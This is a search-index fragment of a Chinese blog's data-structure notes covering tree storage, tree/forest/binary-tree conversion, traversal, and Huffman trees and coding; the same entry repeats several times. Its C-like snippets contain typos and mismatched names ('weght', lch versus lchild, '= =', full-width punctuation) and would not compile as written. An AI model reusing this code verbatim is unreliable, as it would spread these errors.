树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#双亲表示法"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#孩子链表表示法"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#孩子兄弟表示法二叉链表的表示法"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#树与二叉树之间的转换"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef struct{ TElemType data; ChildPtr firstchild; } 树结构： typedef struct{ CTBox nodes[MAX_TREE_SIZE]; int n,r; } **特点：**找孩子容易，找双亲难 孩子兄弟表示法（二叉链表的表示法）**实现：**用二叉链表作树的存储结构，链表中每个结点的两个指针域分别指向其第一个孩子节点和下一个兄弟结点 typedef struct CSNode{ ElemType data; Struct CSNode *firstchild,*nextsibing; }CSNode,*CSTree; **特点：**找孩子和兄弟容易，找双亲困难 树与二叉树之间的转换\r树与二叉树的转换 将树化为二叉树进行处理，利用二叉树的算法来实现对树的操作 由于树和二叉树都可以使用二叉链表作储存结构，则以二叉链表作媒介可以导出树与二叉树之间的一个对应关系 下图中的树和二叉树有相同的二叉链表: 给定一一棵树，可以找到唯一的一棵二叉树与之对应 树变二叉树：兄弟相连留长子 ①加线：在兄弟之间加一连线 ②抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系 ③旋转：以树的根结点为轴心，将树顺时针旋转45° 二叉树变树：左孩右右连双亲，去掉原来右孩线 ①加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子….沿分支找到的所有右孩子，都与p的双亲用线连起来 ②抹线：抹掉原二叉树中双亲与右孩子之间的连线 ③调整：将结点按层次排列，形成树结构 森林转化为二叉树森林变二叉树：树变二叉根相连 ①将各棵树分别转换成二叉树 ②将每个数的根结点用线相连 ③以第一棵树根结点为二叉树的根，再以根节点为轴心，顺时针旋转，构成二叉树结构 二叉树转换成森林二叉树变森林：去掉全部右孩线，孤立二叉再还原 ①抹线：将二叉树根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树 ②还原：将孤立的二叉树还原成树 树的遍历\r先根（次序）遍历：若树不空，则先访问根结点，然后依次先根遍历各棵子树。 后根（次序）遍历：若树不空，则先依次后根遍历各棵子树，然后访问根结点。 按层次遍历：若树不空，则自上而下自左至右访问树种每个结点。 森林的遍历将森林看作由三个部分构成： 1.森林中第一棵树的根结点 2.森林中第一个棵树的子树森林 3.森林中其他树构成的森林 先序遍历依次从左至右对森林中的每一棵树进行先根遍历 若森林不为空，则： 1.访问森林中第一棵树的根结点 2.先序遍历森林中第一棵树的子树森林 3.先序遍历森林中（除第一棵树之外）其余树构成的森林 中序遍历依次从左至右对森林中的每一棵树进行后根遍历 若森林不为空，则 1.中序遍历森林中第一棵树的子树森林 2.访问森林中第一棵树的根结点 3.中序遍历森林中（除第一棵树之外）其余树构成的森林 哈夫曼树**路径：**由一结点到另一结点间的分支所构造 **路径长度：**两结点间路径上的分支数目 **带权路径长度：**结点到根的路径长度与结点上权的乘积 **树的带权路径长度：**树中所有叶子结点的带权路径长度之和 **哈夫曼树：**带权路径长度最小的树 哈夫曼树构造过程**基本思想：**使权大的结点靠近根 **操作要点：**对权值的合并、删除与替换，总是合并当前值最小的两个 构造过程： 根据给定的n个权值{w1,w2,……wn}，构造n棵只有根结点的二叉树。 在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。 在森林中删除这两棵树，同时将新得到的二叉树加入森林中。 重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。 算法实现： 一棵有n个叶子结点的Huffman树有 个结点 采用顺序存储结构——一维结构数组 节点类型定义： typedef struct { int weght; int parent,lch,rch; }*HuffmanTree; 算法： 1)初始化HT[1..2n-1]：lch=rch=parent=0 2)输入初始n个叶子结点：置HT[1..n]的weight值 3)进行以下n-1次合并，依次产生HT[i]，i=n+1..2n-1： 3.1)在HT[1..i-1]中选两个未被选过的weight最小的两个结点HT[s1]和HT[s2] (从parent = 0 的结点中选) 3.2)修改HT[s1]和HT[s2]的parent值： parent=i 3.3)置HT[i]：weight=HT[s1].weight + HT[s2].weight ,lch=s1, rch=s2 哈夫曼编码哈夫曼编码是不等长编码 哈夫曼编码是前缀编码，即任一字符的编码都不是另一字符编码的前缀 哈夫曼编码树中没有度为1的结点。若叶子结点的个数为n，则哈夫曼编码树的结点总数为 2n-1 发送过程：根据由哈夫曼树得到的编码表送出字符数据 接收过程：按左0、右1的规定，从根结点走到一个叶结点，完成一个字符的译码。反复此过程，直到接收数据结束 代码实现： void CreatHuffmanCode(HuffmanTree HT, HuffmanCode \u0026HC, int n){ //从叶子到根逆向求每个字符的赫夫曼编码，存储在编码表HC中 HC=new char *[n+1]; //分配n个字符编码的头指针矢量 cd=new char [n]; //分配临时存放编码的动态数组空间 cd[n-1]=’\\0’; //编码结束符 for(i=1; i\u003c=n; ++i){ //逐个字符求赫夫曼编码 start=n-1; c=i; f=HT[i].parent; while(f!=0){ //从叶子结点开始向上回溯，直到根结点 --start; //回溯一次start向前指一个位置 if (HT[f].lchild= =c) cd[start]=’0’; //结点c是f的左孩子，则生成代码0 else cd[start]=’1’; //结点c是f的右孩子，则生成代码1 c=f; f=HT[f].parent; //继续向上回溯 } //求出第i个字符的编码 HC[i]= new char [n-start]; // 为第i 个字符编码分配空间 strcpy(HC[i], \u0026cd[start])； //将求得的编码从临时空间cd复制到HC的当前行中 } delete cd; //释放临时空间 } // CreatHuffanCode 文件的编码和解码1.编码： ①输入个字符及其权值 ②构造哈夫曼树HT[i] ③进行哈夫曼编码HC[i] ④查HC[i]，得到各字符的哈夫曼编码 2.解码 ①构造哈夫曼树 ②依次读入二进制码 ③读入0，则走向左孩子；读入1，则走向右孩子 ④一旦到达某叶子时，即可译出字符 ⑤然后再从根出发继续译码，直到结束 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#树与二叉树的转换"},{"categories":["notice"],"content":"\r树和森林\r树的存储结构\r双亲表示法**实现：**定义结构数组存放树的结点，每个结点含两个域 **数据域：**存放节点本身信息 **双亲域：**指示本结点的双亲结点在数组中的位置 根结点的下标为0，我们取根结点的双亲结点（不存在）下标为-1 **特点：**找双亲容易，找孩子难 typedef struct PTNode{ TElemType data; int parent; //双亲位置域 } 孩子链表表示法把每个结点的孩子结点排列起来，看成是一个线性表，用单链表存储则把n个结点由n个孩子链表（叶子的孩子链表为空表）。而n个头指针又组成一个线性表，用顺序表（含n个元素的结构数组）存储。 孩子结点结构： typedef struct CTNode{ int child; struct CTNode *next; } 双亲结点结构： typedef 